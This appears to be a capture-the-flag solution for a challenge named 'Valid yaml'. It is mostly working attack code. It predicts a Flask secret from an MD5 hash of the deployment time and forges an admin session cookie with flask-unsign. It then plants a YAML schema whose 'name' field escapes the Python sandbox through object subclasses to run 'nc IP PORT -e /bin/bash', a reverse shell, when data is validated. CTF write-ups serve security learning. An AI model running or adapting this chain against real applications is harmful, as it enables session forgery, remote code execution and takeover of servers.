# Valid yaml

Generate SECRET (timestamp is the minute the instance is deployed)

```python
import datetime
import hashlib

date = datetime.datetime.utcnow().strftime("%d/%m/%Y %H:%M")
print(date)
key = hashlib.md5(date.encode()).hexdigest()
print(key)
```

Sign session cookie:

```bash
# Craft session cookie (cookie name = session)
flask-unsign --sign --cookie "{'id': 'nils'}" --secret '8ff36e9e10763f2e11f7fc59846342d4'
```

Create new schema: (at /admin/schemas)

```yaml
name: str([x.__init__.__globals__["sys"].modules["os"].system("nc IP PORT -e /bin/bash") for x in ''.__class__.__base__.__subclasses__() if "_ModuleLock" == x.__name__])
age: int(max=200)
height: num()
awesome: bool()
```

Validate the schema with date to trigger the payload:

```yaml
name: Bill
age: 200
height: 6.2
awesome: True
```